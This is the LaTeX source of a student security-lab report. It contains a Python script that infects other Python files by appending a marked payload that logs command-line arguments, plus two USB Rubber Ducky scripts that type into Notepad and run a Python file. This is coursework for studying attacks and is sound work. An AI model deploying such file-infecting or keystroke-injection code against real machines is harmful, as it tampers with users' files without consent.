\documentclass{article}
\usepackage[utf8]{inputenc}

\title{CSE3140 â€” Lab 2}
\author{Mike Medved, Eddie Kruah}
\date{October 6th, 2022}

\usepackage{color}
\usepackage{amsthm}
\usepackage{amssymb} 
\usepackage{amsmath}
\usepackage[margin=1in]{geometry} 
\usepackage{listings}
\usepackage{xcolor}
\usepackage{minted}
\usepackage{hyperref}
\usepackage{graphicx}

\hypersetup{
    colorlinks=true,
    linkcolor=blue,
    linkbordercolor={0 0 1}
}

\usemintedstyle{emacs}
% \setmonofont{JetBrains Mono}

\begin{document}

\maketitle

\section*{Deliverables}

\subsection*{Question 1}

\subsubsection*{Part A}

In order to print out all of the files in the current directory, we made a small Python script:

\begin{minted}[fontsize=\scriptsize]{python}
import os

if __name__ == '__main__':
    for file in os.listdir("."):
        if os.path.isfile(os.path.join(".", file)):
            print(file)
\end{minted}

\subsubsection*{Part B}

In order to check all files to see if they have been infected, and then infect them to run a custom payload, we modified our Part A script:

\begin{minted}[fontsize=\scriptsize]{python}
import os
import sys

if __name__ == '__main__':
    # Take in the target and make sure its a Python script
    target = sys.argv[1]
    if not target.endswith(".py"):
        sys.exit(1)
    
    """
    We can check if the file has already been infected by
    checking if any of the lines include the "virus" header
    we will generate.
    """
    injected = False
    with open(target, "r") as f:
        for line in f:
            if "## __virus" in line:
                injected = True
                break

    """
    If the file has not yet been infected, we can inject
    the virus payload to the end of the file. This payload
    will write all command line arguments into "Q1B.out"

    We will start the payload with "## __virus" so that
    we can later detect if the file has already been infected.
    """
    if not injected:
        with open(target, "a") as f:
            f.write("""
## __virus
import sys
import os

with open("Q1B.out", "a") as f:
    f.write(f"{' '.join(sys.argv)}\\n")
""")
\end{minted}

\subsubsection*{Part C}

\textit{Pending}

$\hfill \break$

\subsection*{Question 2}

\textit{Pending}

\subsection*{Question 3}

In order to execute the payload specified for this question, we wrote a Duckyscript and compiled it onto the Rubber Ducky in the lab.

$\hfill \break$
The DuckyScript contained the following payload:

\begin{minted}[fontsize=\scriptsize]{bash}
REM Question 3
REM Target: Windows
REM Stop script once Notepad is opened and names are written
DELAY 3000
GUI r
DELAY 500
STRING notepad
DELAY 500
ENTER
DELAY 500
STRING Mike
DELAY 500
ENTER
DELAY 500
STRING Eddie
\end{minted}

\subsection*{Question 4}

Similarly to Question 3, we wrote a DuckyScript to execute the payload specified for this question.

\begin{minted}[fontsize=\scriptsize]{bash}
REM Question 4
REM Target: Windows
REM Stop script once Python script is written and executed
DELAY 1000
GUI r
DELAY 500
STRING notepad
DELAY 500
ENTER
DELAY 500
STRING print("Hello World")
DELAY 500
ENTER
CONTROL s
DELAY 500
STRING C:\Temp\Q4script.py
ENTER
DELAY 500
GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER
DELAY 500
STRING cd C:\Temp
ENTER
DELAY 500
STRING python3 Q4script.py
ENTER
\end{minted}

\subsection*{Question 5}

\textit{Pending}

\end{document}
